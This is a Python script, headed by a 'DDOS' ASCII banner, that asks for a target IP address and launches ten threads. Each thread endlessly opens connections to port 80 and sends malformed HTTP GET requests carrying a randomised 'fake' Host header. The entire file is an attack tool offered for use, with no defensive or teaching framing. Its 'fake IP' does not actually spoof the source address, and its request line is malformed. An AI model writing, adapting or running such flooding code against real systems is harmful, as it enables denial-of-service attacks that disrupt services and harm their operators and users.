import socket
import threading

banner = """ 

▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
   ░       ░        ░ ░        ░  
 ░       ░                        
"""
print(banner)

target = input("TARGET İP ADDRESS: ")
port = 80

attack_num = 0


def attack():

    while True:

        ip = "{}.{}.{}.{}".format(*__import__("random").sample(range(0,255),4))
        fake_ip = ip

        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"),(target,port))
        s.sendto(("Host:" + fake_ip + "\r\n\r\n").encode("ascii"),(target,port))

        global attack_num
        attack_num += 1
       
        s.close()


for i in range(10):
    thread = threading.Thread(target=attack)
    thread.start()



